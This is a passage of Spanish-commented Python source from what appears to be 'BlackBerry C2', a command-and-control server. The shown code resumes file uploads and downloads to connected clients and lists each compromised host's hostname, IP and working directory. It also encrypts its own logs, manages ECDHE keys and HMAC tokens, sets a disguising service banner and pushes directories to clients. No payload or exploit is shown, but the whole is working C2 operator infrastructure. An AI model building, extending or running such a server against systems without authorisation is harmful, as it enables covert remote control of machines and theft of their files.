def try_resume_transfer(session, cid: int, local_path: str) -> bool:
    """
    Comprueba si existe un .partial + .resume para `local_path`
    y si es así, lanza automáticamente la reanudación.
    Devuelve True si se inició la reanudación.
    """
    resume_file = local_path + ".resume"
    partial_file = local_path + ".partial"
    if not (os.path.exists(resume_file) and os.path.exists(partial_file)):
        return False
    try:
        with open(resume_file) as f:
            meta = json.load(f)
        remote_name = meta.get("remote_name", "")
        direction   = meta.get("direction", "get")
        if not remote_name:
            return False
        if direction == "get":
            xfer = bg_start_get(session, cid, remote_name, local_path)
            print(f"\033[96m[{xfer.id}] Reanudando GET '{remote_name}' en background\033[0m")
        else:
            xfer = bg_start_put(session, cid, local_path, remote_name)
            print(f"\033[96m[{xfer.id}] Reanudando PUT '{remote_name}' en background\033[0m")
        return True
    except Exception as e:
        logging.debug(f"Error leyendo .resume: {e}")
        return False

# ============================================================
#  FIN BACKGROUND TRANSFER MANAGER
# ============================================================

# ==================== PROTECCIÓN CONTRA COMMAND FLOOD ====================
MAX_RESPONSE_QUEUE_SIZE = 1000  # Máximo de respuestas en cola antes de desechar
MAX_COMMANDS_PER_SECOND = 50    # Máximo de comandos por segundo permitidos
COMMAND_FLOOD_WINDOW = 1.0      # Ventana de tiempo para medir rate (1 segundo)
MAX_FLOOD_VIOLATIONS = 3        # Número de violaciones antes de desconectar

# ==================== ORIGINAL TIMEOUTS ====================
HEARTBEAT_TIMEOUT = 180
COMMAND_TIMEOUT = 60
INTERACTIVE_TIMEOUT = 300

os.makedirs(f"{script_dir}/logs", exist_ok=True)

TEMP_HISTORY_FILE = None

# Variable global para mantener el directorio de trabajo actual
CURRENT_WORKING_DIR = os.getcwd()

def calculate_file_timeout(file_size_bytes):
    """Calcula timeout dinámico basado en tamaño de archivo."""
    try:
        size_mb = file_size_bytes / (1024 * 1024)
        timeout = FILE_TIMEOUT_BASE + (size_mb * FILE_TIMEOUT_PER_MB)
        timeout = max(FILE_MIN_TIMEOUT, min(timeout, FILE_MAX_TIMEOUT))
        
        logging.debug(f"Timeout calculado para {format_bytes(file_size_bytes)}: {timeout:.1f}s")
        
        return timeout
    except Exception as e:
        logging.exception(f"Error calculando timeout: {e}")
        return FILE_TIMEOUT_BASE

def format_bytes(bytes_count):
    """Formatea bytes a formato legible"""
    try:
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_count < 1024.0:
                return f"{bytes_count:.2f} {unit}"
            bytes_count /= 1024.0
        return f"{bytes_count:.2f} PB"
    except Exception as e:
        logging.exception(f"Error formateando bytes: {e}")
        return "N/A"

def format_speed(bytes_per_sec):
    """Formatea velocidad de transferencia"""
    return f"{format_bytes(bytes_per_sec)}/s"

def estimate_time_remaining(bytes_remaining, bytes_per_sec):
    """Estima tiempo restante"""
    try:
        if bytes_per_sec <= 0:
            return "calculando..."
        
        seconds = bytes_remaining / bytes_per_sec
        
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            minutes = int(seconds / 60)
            secs = int(seconds % 60)
            return f"{minutes}m {secs}s"
        else:
            hours = int(seconds / 3600)
            minutes = int((seconds % 3600) / 60)
            return f"{hours}h {minutes}m"
    except Exception as e:
        logging.exception(f"Error estimando tiempo: {e}")
        return "N/A"

def show_progress_bar(current, total, width=50, prefix='', suffix=''):
    """Barra de progreso usando solo librerías estándar"""
    try:
        if total == 0:
            percent = 100
        else:
            percent = (current / total) * 100
        
        filled = int(width * current // total) if total > 0 else width
        bar = '█' * filled + '░' * (width - filled)
        
        print(f'\r{prefix} |{bar}| {percent:.1f}% {suffix}', end='', flush=True)
        
        if current >= total:
            print()
    except Exception as e:
        logging.exception(f"Error mostrando barra de progreso: {e}")

def log_transfer(direction, filename, file_size, file_hash, elapsed_time, success, error_msg=None, silent=False):
    """Registra transferencias de archivos en el log"""
    try:
        transfer_type = "UPLOAD" if direction == "put" else "DOWNLOAD"
        status = "SUCCESS" if success else "FAILED"
        
        log_msg = (f"[TRANSFER] {transfer_type} {status} | "
                  f"File: {filename} | "
                  f"Size: {format_bytes(file_size)} | "
                  f"Hash: {file_hash} | "
                  f"Time: {elapsed_time:.2f}s")
        
        if not success and error_msg:
            log_msg += f" | Error: {error_msg}"
        
        # En modo background/silencioso usar debug para no ensuciar la pantalla
        if silent:
            logging.debug(log_msg)
        else:
            logging.info(log_msg)
    except Exception as e:
        logging.exception(f"Error registrando transferencia: {e}")

def mostrar_info_cert(ruta_cert):
    """Muestra información detallada de un certificado X.509"""
    try:
        if not os.path.exists(ruta_cert):
            print(f"[ERROR] El archivo {ruta_cert} no existe.")
            return

        with open(ruta_cert, 'rb') as f:
            datos = f.read()
        
        try:
            cert = x509.load_pem_x509_certificate(datos, default_backend())
        except ValueError:
            cert = x509.load_der_x509_certificate(datos, default_backend())

        print("=== Información del certificado ===")
        print(f"  Sujeto       : {cert.subject.rfc4514_string()}")
        print(f"  Emisor       : {cert.issuer.rfc4514_string()}")
        print(f"  Versión      : {cert.version.name}")
        print(f"  Número serie : {cert.serial_number}")
        print(f"  Algoritmo    : {cert.signature_hash_algorithm.name}")
        print(f"  Válido desde : {cert.not_valid_before}")
        print(f"  Válido hasta : {cert.not_valid_after}")

        pubkey = cert.public_key()
        print(f"  Tipo clave pública : {type(pubkey).__name__}")
        if hasattr(pubkey, 'key_size'):
            print(f"  Tamaño clave: {pubkey.key_size} bits")
        
        print(f"  Fingerprint SHA256 : {cert.fingerprint(hashes.SHA256()).hex()}")
        print("===================================\n")
    except Exception as e:
        logging.exception(f"Error mostrando info de certificado: {e}")
        print(f"[ERROR] No se pudo mostrar información del certificado: {e}")

def mostrar_info_key(ruta_key):
    """Muestra información detallada de una clave privada"""
    try:
        if not os.path.exists(ruta_key):
            print(f"[ERROR] El archivo {ruta_key} no existe.")
            return

        with open(ruta_key, 'rb') as f:
            datos = f.read()
        
        try:
            clave = serialization.load_pem_private_key(datos, password=None, backend=default_backend())
        except ValueError:
            print("[ERROR] La clave está cifrada o en formato no soportado.")
            return

        print("=== Información de la clave privada ===")
        if isinstance(clave, rsa.RSAPrivateKey):
            print("  Algoritmo : RSA")
        elif isinstance(clave, ec.EllipticCurvePrivateKey):
            print("  Algoritmo : ECDSA")
            print(f"  Curva     : {clave.curve.name}")
        elif isinstance(clave, dsa.DSAPrivateKey):
            print("  Algoritmo : DSA")

        if hasattr(clave, 'key_size'):
            print(f"  Tamaño clave: {clave.key_size} bits")
        
        pub_bytes = clave.public_key().public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo
        )
        print(f"  Fingerprint SHA256: {hashlib.sha256(pub_bytes).hexdigest()}")
        print("======================================\n")
    except Exception as e:
        logging.exception(f"Error mostrando info de clave: {e}")
        print(f"[ERROR] No se pudo mostrar información de la clave: {e}")

def setup_temp_history():
    """Crea un archivo temporal para el historial que se borra al salir."""
    global TEMP_HISTORY_FILE
    try:
        fd, TEMP_HISTORY_FILE = tempfile.mkstemp(prefix='blackberry_history_', suffix='.txt')
        os.close(fd)
        
        def cleanup_history():
            try:
                if TEMP_HISTORY_FILE and os.path.exists(TEMP_HISTORY_FILE):
                    os.unlink(TEMP_HISTORY_FILE)
            except Exception as e:
                logging.debug(f"Error limpiando historial temporal: {e}")

        atexit.register(cleanup_history)
        return TEMP_HISTORY_FILE
    except Exception as e:
        logging.exception(f"Error creando historial temporal: {e}")
        return None

def cleanup_history():
    try:
        if TEMP_HISTORY_FILE and os.path.exists(TEMP_HISTORY_FILE):
            os.unlink(TEMP_HISTORY_FILE)
    except Exception as e:
        logging.debug(f"Error en cleanup_history: {e}")

# ── Mensajes de ruido interno que nunca queremos ver en los logs ──────────────
_LOG_NOISE_PATTERNS = [
    "Using selector:",          # asyncio/threading interno de Python
    "EpollSelector",
    "KqueueSelector",
    "SelectSelector",
]

class _NoiseFilter(logging.Filter):
    """Filtra mensajes de ruido interno de Python que no aportan información."""
    def filter(self, record):
        msg = record.getMessage()
        return not any(p in msg for p in _LOG_NOISE_PATTERNS)

# Formato compacto: solo hora (sin fecha) para el archivo, nivel sin prefijo
_FILE_FMT    = "%(asctime)s  %(levelname)-7s  %(message)s"

# ── Log cifrado (Fernet) — solo si se pasa --log-passphrase ──────────────────
class _EncryptedLogHandler(logging.StreamHandler):
    """
    Cifra cada línea de log con AES-256-GCM.
    Derivación de clave: PBKDF2-HMAC-SHA256, 600.000 iteraciones + salt de 16 bytes.
    El salt se guarda en logs/BlackBerryC2_enc.salt (permisos 600).
    Formato de cada línea: base64( nonce[12] + ciphertext+tag )

    Descifrar con dc.py:
        python3 dc.py --log logs/BlackBerryC2_enc.log --salt logs/BlackBerryC2_enc.salt
    """

    _SALT_FILENAME = "BlackBerryC2_enc.salt"
    _LOG_FILENAME  = "BlackBerryC2_enc.log"

    def __init__(self, log_dir: str, passphrase: bytes):
        super().__init__(stream=None)
        self._path = os.path.join(log_dir, self._LOG_FILENAME)
        salt_path  = os.path.join(log_dir, self._SALT_FILENAME)

        # Reutilizar salt existente para que sesiones anteriores sigan legibles
        if os.path.exists(salt_path):
            with open(salt_path, 'rb') as f:
                salt = f.read()
            if len(salt) != 16:          # salt corrupto → generar nuevo
                salt = secrets.token_bytes(16)
                with open(salt_path, 'wb') as f:
                    f.write(salt)
        else:
            salt = secrets.token_bytes(16)
            os.makedirs(log_dir, exist_ok=True)
            with open(salt_path, 'wb') as f:
                f.write(salt)
            try:
                os.chmod(salt_path, 0o600)
            except OSError:
                pass

        # Derivar clave AES-256 con PBKDF2
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600_000,
        )
        self._key = kdf.derive(passphrase)
        # Exponer al visor de logs sin necesidad de re-derivar
        global _SERVER_LOG_KEY
        _SERVER_LOG_KEY = self._key

    def emit(self, record):
        try:
            msg   = self.format(record).encode('utf-8', 'replace')
            nonce = secrets.token_bytes(12)
            ciph  = AESGCM(self._key).encrypt(nonce, msg, None)
            line  = base64.b64encode(nonce + ciph) + b'\n'
            with open(self._path, 'ab') as fh:
                fh.write(line)
        except Exception:
            self.handleError(record)
_FILE_DATEFMT = "%H:%M:%S"
_CONSOLE_FMT = "%(levelname)-7s  %(message)s"

def setup_logging(verbose=0, log_passphrase: bytes | None = None):
    """
    Configura logging:
      - Archivo  → INFO+ siempre (sin DEBUG ruido de Python internals)
      - Consola  → WARNING (verbose=0) | INFO (verbose=2) | DEBUG (verbose=1)
    Rota el log si supera 2 MB (máx 3 archivos históricos).
    """
    global VERBOSE_MODE
    VERBOSE_MODE = verbose

    try:
        from logging.handlers import RotatingFileHandler as _RFH
        _rot_available = True
    except ImportError:
        _rot_available = False

    try:
        logger = logging.getLogger()
        # Limpiar handlers previos (reconfiguración en caliente con v/vv)
        for h in list(logger.handlers):
            try:
                h.close()
            except Exception:
                pass
            logger.removeHandler(h)
        logger.setLevel(logging.DEBUG)

        noise = _NoiseFilter()
        log_path = os.path.join(script_dir, "logs", "BlackBerryC2_Server.log")
        os.makedirs(os.path.dirname(log_path), exist_ok=True)

        # ── Handler de archivo ────────────────────────────────────────────────
        file_fmt = logging.Formatter(_FILE_FMT, datefmt=_FILE_DATEFMT)
        if _rot_available:
            fh = _RFH(log_path, maxBytes=2 * 1024 * 1024, backupCount=3, encoding="utf-8")
        else:
            fh = logging.FileHandler(log_path, encoding="utf-8")
        fh.setLevel(logging.INFO)   # INFO+: no hay DEBUG noise en el archivo
        fh.setFormatter(file_fmt)
        fh.addFilter(noise)
        logger.addHandler(fh)

        # ── Handler de consola ───────────────────────────────────────────────
        con_fmt = logging.Formatter(_CONSOLE_FMT)
        ch = logging.StreamHandler()
        if verbose == 0:
            ch.setLevel(logging.WARNING)
        elif verbose == 1:
            ch.setLevel(logging.DEBUG)    # -v: todo incluyendo debug
        else:
            ch.setLevel(logging.INFO)     # -vv: info normal
        ch.setFormatter(con_fmt)
        ch.addFilter(noise)
        logger.addHandler(ch)

        # Si se pasó passphrase, usar handler cifrado AES-256-GCM + PBKDF2
        if log_passphrase:
            try:
                log_dir = os.path.join(script_dir, "logs")
                enc_fmt = logging.Formatter(_FILE_FMT, datefmt=_FILE_DATEFMT)
                eh = _EncryptedLogHandler(log_dir, log_passphrase)
                eh.setLevel(logging.INFO)
                eh.setFormatter(enc_fmt)
                eh.addFilter(noise)
                logger.addHandler(eh)
                # Desactivar el handler plano — solo logs cifrados en disco
                for h in list(logger.handlers):
                    if isinstance(h, logging.FileHandler) and not isinstance(h, _EncryptedLogHandler):
                        try: h.close()
                        except: pass
                        logger.removeHandler(h)
                logging.info("[LOG-ENC] Cifrado AES-256-GCM activo (PBKDF2 600k iter)")
            except Exception as e:
                print(f"[!] Error configurando log cifrado: {e} — usando log plano")

        # Silenciar módulos de Python que generan spam de DEBUG irrelevante
        for noisy_lib in ("asyncio", "urllib3", "concurrent.futures",
                          "threading", "selectors"):
            logging.getLogger(noisy_lib).setLevel(logging.WARNING)

    except Exception as e:
        print(f"Error configurando logging: {e}")

# ══════════════════════════════════════════════════════════════════════════════
#  STARTUP DISPLAY  &  SESSION LOGGING
# ══════════════════════════════════════════════════════════════════════════════

_SERVER_START_TIME = time.time()

def _log_session_event(event: str, session=None, extra: dict = None):
    """Guarda un evento de sesión en logs/sessions.jsonl.
    Si _SESSION_LOG_KEY está activo, cada línea se cifra con AES-256-GCM."""
    try:
        rec = {
            "ts":    time.strftime("%Y-%m-%dT%H:%M:%S"),
            "event": event,
        }
        if session:
            rec["cid"]      = session.session_id
            rec["ip"]       = session.address[0]
            rec["port"]     = session.address[1]
            rec["hostname"] = session.get_hostname() or "?"
        if extra:
            rec.update(extra)
        log_path = os.path.join(script_dir, "logs", "sessions.jsonl")
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        line = json.dumps(rec)
        if _SESSION_LOG_KEY:
            nonce = secrets.token_bytes(12)
            ciph  = AESGCM(_SESSION_LOG_KEY).encrypt(nonce, line.encode('utf-8'), None)
            line  = base64.b64encode(nonce + ciph).decode('ascii')
        with open(log_path, "a") as f:
            f.write(line + "\n")
    except Exception as e:
        logging.debug(f"_log_session_event error: {e}")


def _save_startup_config(token: str, host: str, port: int, persistent: bool, no_secure: bool):
    """Guarda la configuración de este inicio en logs/last_start.json."""
    try:
        rec = {
            "started":    time.strftime("%Y-%m-%dT%H:%M:%S"),
            "host":       host,
            "port":       port,
            "hmac_token": token,
            "persistent": persistent,
            "no_secure":  no_secure,
            "pid":        os.getpid(),
        }
        path = os.path.join(script_dir, "logs", "last_start.json")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump(rec, f, indent=2)
    except Exception as e:
        logging.debug(f"_save_startup_config error: {e}")


def startup_display(host: str, port: int, token: str, persistent: bool,
                    no_secure: bool, key_exists: bool, verbose: int):
    """Pantalla de inicio: banner compacto + config esencial."""
    W  = "\033[0m"
    G  = "\033[92m"
    Y  = "\033[93m"
    C  = "\033[96m"
    B  = "\033[94m"
    R  = "\033[91m"
    BD = "\033[1m"
    DM = "\033[2m"

    cols = 60
    sep  = f"{DM}{'─' * cols}{W}"

    # Línea de timestamp + PID
    ts  = time.strftime("%Y-%m-%d  %H:%M:%S")
    pid = os.getpid()

    listen_addr = f"{host}:{port}" if host != "0.0.0.0" else f"0.0.0.0:{port}  (todas las interfaces)"

    key_status = (f"{G}persistente{W}" if (persistent and key_exists)
                  else f"{Y}nueva (persistente){W}" if persistent
                  else f"{Y}efímera  (temporal){W}")

    hmac_status = (f"{R}{BD}DESACTIVADO  (--no-secure){W}" if no_secure
                   else f"{G}ACTIVO{W}")

    verb_map = {0: f"{DM}silencioso{W}", 1: f"{C}debug{W}", 2: f"{B}verbose{W}"}
    verb_str = verb_map.get(verbose, f"{DM}silencioso{W}")

    print(sep)
    print(f"  {C}Escuchando{W}   {BD}{listen_addr}{W}")
    print(f"  {C}ECDHE key{W}    {key_status}")
    print(f"  {C}HMAC auth{W}    {hmac_status}")
    if not no_secure:
        print(f"  {C}Token{W}        {BD}{token}{W}")
        print(f"  {DM}             cliente:  --hmac {token}{W}")
    log_file_label = "BlackBerryC2_enc.log" if getattr(startup_display, '_log_encrypted', False) else "BlackBerryC2_Server.log"
    log_enc_note   = f" {G}[cifrado]{W}" if getattr(startup_display, '_log_encrypted', False) else ""
    print(f"  {C}Logging{W}      {verb_str}{log_enc_note}   → logs/{log_file_label}")
    print(sep)
    print(f"  {DM}Comandos: help · list · select N · report · exit{W}")
    print() 

def print_report():
    """Muestra un reporte de estado del servidor en el shell interactivo."""
    W  = "\033[0m"
    G  = "\033[92m"
    Y  = "\033[93m"
    C  = "\033[96m"
    R  = "\033[91m"
    BD = "\033[1m"
    DM = "\033[2m"

    now     = time.time()
    uptime  = int(now - _SERVER_START_TIME)
    cols    = 62
    sep     = f"{DM}{'─' * cols}{W}"
    title   = lambda t: f"  {C}{BD}{t}{W}"

    def fup(s):
        m, sec = divmod(s, 60); h, m = divmod(m, 60); d, h = divmod(h, 24)
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m: parts.append(f"{m}m")
        parts.append(f"{sec}s")
        return " ".join(parts)

    print()
    print(f"  {BD}{G}BlackBerry C2 — Reporte{W}   {DM}{time.strftime('%Y-%m-%d %H:%M:%S')}{W}")
    print(sep)

    # ── Servidor ──────────────────────────────────────────────────
    print(title("Servidor"))
    print(f"    Uptime        {fup(uptime)}")
    print(f"    PID           {os.getpid()}")

    try:
        lf = os.path.join(script_dir, "logs", "last_start.json")
        if os.path.exists(lf):
            with open(lf) as f:
                cfg = json.load(f)
            print(f"    Escuchando    {cfg.get('host','?')}:{cfg.get('port','?')}")
            print(f"    HMAC token    {cfg.get('hmac_token','?')}")
            print(f"    Iniciado      {cfg.get('started','?')}")
    except Exception:
        pass

    print()

    # ── Conexiones activas ────────────────────────────────────────
    print(title("Conexiones activas"))
    with conn_lock:
        active = list(connections.items())
    if not active:
        print(f"    {DM}(ninguna){W}")
    else:
        for cid, s in active:
            ip   = s.address[0]
            host = s.get_hostname() or ip
            age  = fup(int(now - s.start_time))
            sent = format_bytes(s.bytes_sent)
            recv = format_bytes(s.bytes_received)
            cwd  = getattr(s, "last_cwd", "?") or "?"
            print(f"    {G}#{cid}{W}  {BD}{host}{W}  {DM}{ip}{W}")
            print(f"        cwd: {cwd}   ↑{sent}  ↓{recv}   viva {age}")
    print()

    # ── Transferencias ────────────────────────────────────────────
    print(title("Transferencias bg"))
    all_x = bg_all()
    running = [x for x in all_x if x.status == "running"]
    done    = [x for x in all_x if x.status == "done"]
    failed  = [x for x in all_x if x.status == "failed"]
    cancelled = [x for x in all_x if x.status == "cancelled"]
    if not all_x:
        print(f"    {DM}(ninguna registrada){W}")
    else:
        print(f"    En curso   {G}{BD}{len(running)}{W}   Completadas {G}{len(done)}{W}"
              f"   Fallidas {R}{len(failed)}{W}   Canceladas {Y}{len(cancelled)}{W}")
        for x in running:
            pct = int(x.bytes_done / x.total_bytes * 100) if x.total_bytes else 0
            print(f"    {C}[{x.id}]{W} {x.direction.upper()} {os.path.basename(x.remote_name)}  {pct}%")
    print()

    # ── Log de sesiones (últimas 10) ──────────────────────────────
    print(title("Últimas sesiones"))
    slog = os.path.join(script_dir, "logs", "sessions.jsonl")
    try:
        if os.path.exists(slog):
            with open(slog) as f:
                lines = f.readlines()
            for line in lines[-10:]:
                try:
                    r = json.loads(line)
                    ev  = r.get("event", "?")
                    ts  = r.get("ts", "?")
                    ip  = r.get("ip", "")
                    hn  = r.get("hostname", "")
                    col = G if ev == "connect" else (R if ev == "disconnect" else Y)
                    print(f"    {col}{ev:12s}{W}  {ts}  {BD}{hn or ip}{W}  {DM}{ip}{W}")
                except Exception:
                    pass
        else:
            print(f"    {DM}(sin registros aún){W}")
    except Exception:
        print(f"    {DM}(sin registros){W}")
    print(sep)
    print()


HOST = '0.0.0.0'
PORT = 9949
server_socket = None
server_socket_lock = threading.Lock()
connections = {}
conn_lock = threading.Lock()
conn_id_counter = 0

ECDHE_CERT_DIR = os.path.join(script_dir, "ecdhe-cert")
ECDHE_PRIVATE_KEY_FILE = os.path.join(ECDHE_CERT_DIR, "BlackBerryServerC2_ECDHEprivate.pem")
ECDHE_PUBLIC_KEY_FILE = os.path.join(ECDHE_CERT_DIR, "BlackBerryServerC2_ECDHEpublic.pem")

def format_uptime(seconds):
    """Formatea segundos en formato legible (días, horas, minutos, segundos)"""
    try:
        if seconds < 0:
            return "N/A"
        
        days = int(seconds // 86400)
        hours = int((seconds % 86400) // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        if secs > 0 or not parts:
            parts.append(f"{secs}s")
        
        return " ".join(parts)
    except Exception as e:
        logging.exception(f"Error formateando uptime: {e}")
        return "N/A"

def is_server_running():
    """Verifica si hay otra instancia del servidor corriendo"""
    # Esta función puede implementarse si se necesita
    return False

def load_or_generate_ecdhe_keys(persistent=False, passphrase: bytes | None = None):
    """Carga o genera claves ECDHE (secp256r1) según el modo.
    
    Si persistent=True y passphrase!=None:
      - Al cargar: descifra la clave con la passphrase.
        Si la clave estaba sin cifrar, la re-cifra automáticamente.
      - Al generar: cifra la clave con BestAvailableEncryption(passphrase).
    Si passphrase es None, la clave se guarda/lee sin cifrar (retrocompatible).
    """
    try:
        enc_algo = (
            serialization.BestAvailableEncryption(passphrase)
            if passphrase
            else serialization.NoEncryption()
        )

        if persistent:
            os.makedirs(ECDHE_CERT_DIR, exist_ok=True)
            
            if os.path.exists(ECDHE_PRIVATE_KEY_FILE) and os.path.exists(ECDHE_PUBLIC_KEY_FILE):
                try:
                    with open(ECDHE_PRIVATE_KEY_FILE, 'rb') as f:
                        raw_key_data = f.read()

                    # ── Intento 1: con passphrase dada ────────────────────────
                    private_key = None
                    was_unencrypted = False
                    try:
                        private_key = serialization.load_pem_private_key(
                            raw_key_data, password=passphrase, backend=default_backend()
                        )
                    except (ValueError, TypeError):
                        # ── Intento 2: sin passphrase (clave no cifrada) ──────
                        if passphrase:
                            try:
                                private_key = serialization.load_pem_private_key(
                                    raw_key_data, password=None, backend=default_backend()
                                )
                                was_unencrypted = True
                            except Exception:
                                private_key = None

                    if private_key is None:
                        raise ValueError(
                            "BlackBerry ✗  Passphrase incorrecta — "
                            "no se pudo descifrar la clave ECDHE.\n"
                            "    Tip: si olvidaste la passphrase elimina "
                            f"'{ECDHE_CERT_DIR}/' para generar una nueva."
                        )

                    with open(ECDHE_PUBLIC_KEY_FILE, 'rb') as f:
                        public_pem = f.read()

                    # Si la clave estaba sin cifrar y ahora hay passphrase → re-cifrar
                    if was_unencrypted and passphrase:
                        print(f"\033[93m[!] La clave estaba almacenada sin cifrar.\033[0m")
                        print(f"\033[92m[+] Cifrando con la passphrase proporcionada...\033[0m")
                        new_private_pem = private_key.private_bytes(
                            encoding=serialization.Encoding.PEM,
                            format=serialization.PrivateFormat.PKCS8,
                            encryption_algorithm=enc_algo
                        )
                        tmp = ECDHE_PRIVATE_KEY_FILE + ".tmp"
                        with open(tmp, 'wb') as f:
                            f.write(new_private_pem)
                        os.chmod(tmp, 0o600)
                        os.rename(tmp, ECDHE_PRIVATE_KEY_FILE)
                        print(f"\033[92m[+] Clave re-cifrada y guardada.\033[0m")
                        logging.info("Clave ECDHE migrada de sin-cifrar a cifrada con passphrase")

                    logging.info(f"Claves ECDHE persistentes cargadas desde {ECDHE_CERT_DIR}")
                    fingerprint = get_ecdhe_key_fingerprint(public_pem)
                    logging.debug(f"Fingerprint ECDHE persistente: {fingerprint}")
                    return private_key, public_pem

                except ValueError:
                    raise   # Re-lanzar los ValueError legibles
                except Exception as e:
                    logging.warning(f"Error cargando claves persistentes: {e}. Generando nuevas...")
            
            private_key = ec.generate_private_key(ec.SECP256R1())
            public_key = private_key.public_key()
            
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=enc_algo
            )
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            try:
                with open(ECDHE_PRIVATE_KEY_FILE, 'wb') as f:
                    f.write(private_pem)
                os.chmod(ECDHE_PRIVATE_KEY_FILE, 0o600)
                
                with open(ECDHE_PUBLIC_KEY_FILE, 'wb') as f:
                    f.write(public_pem)
                
                logging.info(f"Nuevas claves ECDHE persistentes generadas en {ECDHE_CERT_DIR}")
                if passphrase:
                    logging.info("Clave privada cifrada con passphrase (BestAvailableEncryption)")
                fingerprint = get_ecdhe_key_fingerprint(public_pem)
                logging.debug(f"Fingerprint ECDHE persistente: {fingerprint}")
                
            except Exception as e:
                logging.error(f"Error guardando claves persistentes: {e}")
                raise
            
            return private_key, public_pem
        else:
            private_key = ec.generate_private_key(ec.SECP256R1())
            public_key = private_key.public_key()
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            logging.info("Par ECDHE temporal generado (secp256r1)")
            return private_key, public_pem
    except ValueError:
        raise  # Mensajes legibles ya formateados
    except Exception as e:
        logging.exception(f"Error en load_or_generate_ecdhe_keys: {e}")
        raise

def load_service_banner():
    """Carga el banner del servicio desde archivo o usa el por defecto."""
    global SERVICE_BANNER
    try:
        if os.path.exists(SERVICE_BANNER_FILE):
            with open(SERVICE_BANNER_FILE, 'r', encoding='utf-8') as f:
                banner = f.read().strip()
                if banner:
                    SERVICE_BANNER = banner
                    logging.debug(f"Banner cargado desde archivo: {SERVICE_BANNER}")
        else:
            save_service_banner()
    except Exception as e:
        logging.warning(f"Error cargando banner: {e}")

def save_service_banner():
    """Guarda el banner actual en archivo."""
    try:
        os.makedirs(os.path.dirname(SERVICE_BANNER_FILE), exist_ok=True)
        with open(SERVICE_BANNER_FILE, 'w', encoding='utf-8') as f:
            f.write(SERVICE_BANNER)
        logging.debug(f"Banner guardado: {SERVICE_BANNER}")
        return True
    except Exception as e:
        logging.error(f"Error guardando banner: {e}")
        return False

def set_service_banner(new_banner):
    """Cambia el banner del servicio."""
    global SERVICE_BANNER
    try:
        if not new_banner or len(new_banner.strip()) == 0:
            return False, "El banner no puede estar vacío"
        
        if any(ord(c) < 32 and c not in ['\t', '\n', '\r'] for c in new_banner):
            return False, "El banner contiene caracteres de control inválidos"
        
        SERVICE_BANNER = new_banner.strip()
        if save_service_banner():
            return True, f"Banner cambiado a: {SERVICE_BANNER}"
        else:
            return False, "Error guardando el nuevo banner"
    except Exception as e:
        logging.exception(f"Error en set_service_banner: {e}")
        return False, f"Error: {e}"

def get_ecdhe_key_fingerprint(public_key_pem):
    """Genera un fingerprint SHA256 de la clave pública ECDHE."""
    try:
        if isinstance(public_key_pem, bytes):
            pem_data = public_key_pem
        else:
            pem_data = public_key_pem.encode('utf-8')
        
        public_key = serialization.load_pem_public_key(pem_data)
        
        der_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        fingerprint = hashlib.sha256(der_bytes).hexdigest()
        formatted_fp = ':'.join(fingerprint[i:i+2] for i in range(0, len(fingerprint), 2))
        
        return formatted_fp
    except Exception as e:
        logging.exception(f"Error calculando fingerprint: {e}")
        return None

def is_socket_valid(sock):
    """Verifica si un socket sigue siendo válido."""
    try:
        sock.getpeername()
        return True
    except (OSError, AttributeError) as e:
        logging.debug(f"Socket inválido: {e}")
        return False
    except Exception as e:
        logging.exception(f"Error verificando socket: {e}")
        return False

# ==================== FUNCIONES DE TRANSFERENCIA RECURSIVA INTEGRADAS ====================

def normalize_path(path):
    """Normaliza una ruta para prevenir directory traversal."""
    if not path:
        return None
    normalized = os.path.normpath(path)
    if '..' in normalized.split(os.sep):
        return None
    return normalized

def send_directory_recursive_to_client(session, dir_path, base_path=None):
    """
    Envía un directorio completo al cliente de forma recursiva (para put -r).
    Protocolo: DIR_START → FILE_ITEM → SIZE → chunks → DIR_END
    """
    try:
        sock = session.socket
        aes_key = session.aes_key
        
        # Normalizar rutas
        dir_path = normalize_path(dir_path)
        if not dir_path or not os.path.isdir(dir_path):
            print(f"{ALERT} {RED}Directorio no encontrado: {dir_path}{RESET}")
            return False
        
        # Establecer base_path si es la primera llamada
        if base_path is None:
            base_path = os.path.dirname(dir_path) if os.path.dirname(dir_path) else "."
            base_path = normalize_path(base_path)
        
        # Calcular ruta relativa
        rel_path = os.path.relpath(dir_path, base_path)
        
        # Metadatos del directorio
        dir_metadata = {
            "type": "directory",
            "path": rel_path,
            "name": os.path.basename(dir_path)
        }
        
        # Enviar DIR_START
        msg = f"DIR_START {json.dumps(dir_metadata)}"
        if not send_encrypted_message(sock, msg, aes_key, timeout=10, session=session):
            print(f"{ALERT} {RED}Error enviando DIR_START{RESET}")
            return False
        
        # Recorrer contenido
        try:
            entries = sorted(os.listdir(dir_path))
        except PermissionError:
            print(f"{B_YELLOW}[!] Permiso denegado: {dir_path}{RESET}")
            send_encrypted_message(sock, "DIR_END", aes_key, timeout=10, session=session)
            return True
        
        for entry in entries:
            entry_path = os.path.join(dir_path, entry)
            entry_path = normalize_path(entry_path)
            if not entry_path:
                continue
            
            if os.path.islink(entry_path):
                continue
            elif os.path.isdir(entry_path):
                if not send_directory_recursive_to_client(session, entry_path, base_path):
                    return False
            elif os.path.isfile(entry_path):
                if not send_file_in_directory_context_to_client(session, entry_path, base_path):
                    return False
        
        # Enviar DIR_END
        if not send_encrypted_message(sock, "DIR_END", aes_key, timeout=10, session=session):
            print(f"{ALERT} {RED}Error enviando DIR_END{RESET}")
            return False
        
        return True
